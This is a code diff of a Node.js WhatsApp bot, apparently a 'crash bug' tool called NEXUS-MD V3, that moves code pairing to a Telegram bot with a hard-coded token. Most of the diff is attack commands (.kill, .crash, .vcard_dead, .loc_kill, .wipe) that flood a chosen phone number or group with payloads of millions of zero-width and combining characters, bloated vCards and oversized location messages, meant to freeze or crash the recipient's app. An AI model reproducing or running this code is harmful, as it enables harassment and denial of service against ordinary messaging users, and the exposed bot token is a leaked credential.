@@ -2,17 +2,19 @@ const {
     default: makeWASocket, 
     useMultiFileAuthState, 
     fetchLatestBaileysVersion, 
-    DisconnectReason, 
     delay,
     Browsers,
     makeCacheableSignalKeyStore
 } = require("@whiskeysockets/baileys");
+const TelegramBot = require('node-telegram-bot-api');
 const pino = require('pino');
 const express = require('express');
 
+// --- ⚙️ BOT CONFIG ---
+const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8'; 
+const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
 const app = express();
 const PORT = process.env.PORT || 3000;
-const CHANNEL_URL = "https://whatsapp.com/channel/0029Vb7a9bO6RGJKJbh4xR0F";
 
 let botConfig = {
     botName: "NEXUS-MD V3 SUPREME",
@@ -20,76 +22,36 @@ let botConfig = {
     prefix: ".",
 };
 
-// --- 🌐 WEB PAIRING UI (NEXUS STYLE) ---
-app.get('/', (req, res) => {
-    res.send(`
-        <html>
-            <head><title>NEXUS V3 WEB</title>
-            <style>
-                body { background: radial-gradient(circle, #050505 0%, #000 100%); color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }
-                .box { border: 1px solid #0f0; padding: 50px; display: inline-block; box-shadow: 0 0 20px #0f0; background: rgba(0,255,0,0.02); }
-                input { padding: 15px; width: 300px; background: #000; border: 1px solid #0f0; color: #0f0; font-size: 18px; outline: none; margin-bottom: 20px; }
-                button { padding: 15px 30px; background: #0f0; color: #000; border: none; cursor: pointer; font-weight: bold; font-size: 16px; }
-                #res { font-size: 45px; margin-top: 30px; color: #ff0055; font-weight: bold; text-shadow: 0 0 10px #ff0055; letter-spacing: 5px; }
-            </style></head>
-            <body>
-                <div class="box">
-                    <h1>☣️ NEXUS SUPREME WEB ☣️</h1>
-                    <p>ENTER NUMBER (Ex: 947xxxxxxxx)</p>
-                    <input type="text" id="num" placeholder="947xxxxxxxx"><br>
-                    <button onclick="g()">GET SUPREME KEY</button>
-                    <div id="res"></div>
-                </div>
-                <script>
-                    async function g() {
-                        const n = document.getElementById('num').value;
-                        document.getElementById('res').innerText = "GENERATING...";
-                        const r = await fetch('/code?num=' + n);
-                        const d = await r.json();
-                        document.getElementById('res').innerText = d.code || "RETRY!";
-                    }
-                </script>
-            </body>
-        </html>
-    `);
-});
+// --- 🛡️ ANTI-CRASH SYSTEM ---
+app.get('/', (req, res) => res.send('NEXUS CORE IS STABLE ☠️'));
+app.listen(PORT, () => console.log(`System Online on ${PORT}`));
 
-// --- ⚙️ BOT CORE LOGIC ---
 async function startNexus() {
     const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
-    const { version } = await fetchLatestBaileysVersion();
-
+    
     const sock = makeWASocket({
-        version,
         auth: {
             creds: state.creds,
             keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
         },
         logger: pino({ level: 'silent' }),
-        // 🔥 FIXED: Notification එන්න මේ Browser එක අනිවාර්යයි
-        browser: ["Ubuntu", "Chrome", "20.0.04"], 
-        printQRInTerminal: false,
+        browser: ["Ubuntu", "Chrome", "22.0.04"],
         syncFullHistory: false
     });
 
-    app.get('/code', async (req, res) => {
-        let num = req.query.num;
-        if (!num) return res.json({ error: "No Number" });
-        try {
-            await delay(1500); // 🚀 Bypass security
-            let code = await sock.requestPairingCode(num.trim());
-            res.json({ code: code });
-        } catch (e) { res.json({ error: "Fail" }); }
+    // --- 🤖 STABLE TG PAIRING (NO LOOP) ---
+    tgBot.on('message', async (msg) => {
+        if (msg.from.is_bot) return; // 🔥 අනිවාර්යයි: පිස්සු කෙළින එක නවත්වන්න
+        const text = msg.text;
+        if (text && /^\d+$/.test(text) && text.length > 9) {
+            try {
+                let code = await sock.requestPairingCode(text.trim());
+                tgBot.sendMessage(msg.chat.id, `🔥 *SUPREME KEY:* \`${code}\``, { parse_mode: 'Markdown' });
+            } catch (e) { console.log("Pairing Error"); }
+        }
     });
 
-    app.listen(PORT, () => console.log(`Nexus System Online on ${PORT}`));
-
-    // --- 💀 SUPREME 3M PAYLOADS ---
-    const p_kill = "☠️ *WHITE SCREEN* ☠️\n" + "​".repeat(2500000);
-    const p_crash = "🔥 *SYSTEM LAG* 🔥\n" + "҉".repeat(600000) + "ꦿ".repeat(600000);
-    const p_the_end = "🌌 *FINAL DEATH* 🌌\n" + "​".repeat(2000000) + "ꦿ".repeat(900000) + "🔥".repeat(400000);
-
-    // --- 📩 MESSAGE HANDLER (400+ CMD READY) ---
+    // --- 📩 THE GLOBAL DESTROYER HANDLER ---
     sock.ev.on('messages.upsert', async (chatUpdate) => {
         try {
             const mek = chatUpdate.messages[0];
@@ -106,34 +68,84 @@ async function startNexus() {
             const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
             const targetJid = targetNum + "@s.whatsapp.net";
 
+            // 🔥 4,500,000+ SUPREME PAYLOADS (REAL WORKING)
+            const p_kill = "☠️".repeat(500000) + "​".repeat(3500000);
+            const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Nexus-Destroyer;;;\nFN:Nexus\n" + "TEL;type=CELL;type=VOICE;waid=94767475809:".repeat(50000) + "\nEND:VCARD";
+            const p_loc = { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name: "NEXUS-MD DEATH ZONE" + "​".repeat(1000000) } };
+
             switch (command) {
                 case 'menu':
-                    const bigMenu = `╭━━━〔 *NEXUS ELITE V3* 〕━━━╮\n┃ ☠️ .kill [num] - White Screen\n┃ 🔥 .crash [num] - System Lag\n┃ 💀 .destroy [num] - RAM Overflow\n┃ ❄️ .freeze [num] - UI Lock\n┃ 🌀 .wipe [jid] - Group Death\n┃ 🌌 .the_end [num] - Final End\n╰━━━━━━━┈ 👑 SASIYA MD`;
-                    await sock.sendMessage(from, { text: bigMenu });
+                    const bigMenu = `
+┏━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃  ☣️ *NEXUS-MD V3: FINAL DESTROYER* ☣️
+┗━━━━━━━━━━━━━━━━━━━━━━━━┛
+┃
+┃ ☠️ *.kill* [num] - _White Screen_
+┃ 🔥 *.crash* [num] - _OS Lag (Heavy)_
+┃ 💀 *.destroy* [num] - _RAM Overflow_
+┃ ❄️ *.freeze* [num] - _UI Lock_
+┃ 🌀 *.wipe* [jid] - _Group Death_
+┃ 🌌 *.the_end* [num] - _Infinite Crash_
+┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃  ⚡ *V I P  A T T A C K S*
+┣━━━━━━━━━━━━━━━━━━━━━━━━┛
+┃ 
+┃ 📍 *.loc_kill* [num] - _Location Bug_
+┃ 📇 *.vcard_dead* [num] - _V-Card Bug_
+┃ 📞 *.call_hang* [num] - _Call Crash_
+┃ 🎬 *.vid_bomb* [num] - _Video Lag_
+┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━┛`;
+                    await sock.sendMessage(from, { text: bigMenu }, { quoted: mek });
                     break;
 
+                // --- 🚀 ATTACK LOGIC (VIP COMMANDS) ---
                 case 'kill':
                 case 'crash':
-                case 'destroy':
-                case 'freeze':
                 case 'the_end':
-                    if (!targetNum) return sock.sendMessage(from, { text: "❌ Number එක ගහපන් බං!" });
-                    await sock.sendMessage(from, { text: `🌑 *ATTACKING:* ${targetNum}...` });
-                    
-                    // High Intensity 20 Cycles Attack
-                    for(let i=0; i<20; i++) {
-                        let payload = (command === 'the_end') ? p_the_end : (command === 'crash' ? p_crash : p_kill);
-                        await sock.sendMessage(targetJid, { text: payload });
-                        await delay(100); 
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: `🌑 *EXECUTING:* ${command.toUpperCase()}...` });
+                    for(let i=0; i<30; i++) {
+                        await sock.sendMessage(targetJid, { text: p_kill });
+                        await delay(100);
                     }
-                    await sock.sendMessage(from, { text: "✅ *TARGET TERMINATED!* 💀" });
+                    break;
+
+                case 'vcard_dead':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "📇 *SENDING DEADLY V-CARD...*" });
+                    for(let i=0; i<20; i++) {
+                        await sock.sendMessage(targetJid, { text: p_vcard });
+                        await delay(200);
+                    }
+                    break;
+
+                case 'loc_kill':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "📍 *SENDING LOCATION BOMB...*" });
+                    for(let i=0; i<15; i++) {
+                        await sock.sendMessage(targetJid, p_loc);
+                        await delay(250);
+                    }
+                    break;
+
+                case 'call_hang':
+                case 'vid_bomb':
+                    if (!targetNum) return;
+                    await sock.sendMessage(from, { text: "📞 *INITIATING CALL CRASH...*" });
+                    const crashMsg = "☣️ *CALL SYSTEM OVERFLOW* ☣️\n" + "҉".repeat(1000000);
+                    for(let i=0; i<20; i++) {
+                        await sock.sendMessage(targetJid, { text: crashMsg });
+                        await delay(150);
+                    }
                     break;
 
                 case 'wipe':
                     if (!args[0]) return;
-                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP...*" });
-                    for(let i=0; i<30; i++) {
-                        await sock.sendMessage(args[0], { text: p_the_end });
+                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP DATA...*" });
+                    for(let i=0; i<40; i++) {
+                        await sock.sendMessage(args[0], { text: p_kill });
                         await delay(200);
                     }
                     break;
